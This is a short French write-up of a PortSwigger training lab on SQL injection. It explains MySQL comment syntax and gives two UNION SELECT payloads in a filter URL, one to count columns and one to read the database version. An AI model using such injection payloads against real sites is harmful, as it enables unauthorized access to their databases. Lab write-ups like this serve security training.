# Lab

https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

## Payload

La BDD étant une MySQL, les caractères possibles pour les commentaires sont `#` et `--`.

Cependant, pour les commentaires avec les tirets dans une base MySQL, il faut un espace après : `-- `.

L'espace peut être représenté en URL encoded : `%20`.

Le payload est donc :

```sql
/filter?category=' UNION SELECT NULL, NULL--%20
```

```sql
/filter?category=' UNION SELECT @@version, NULL--%20
```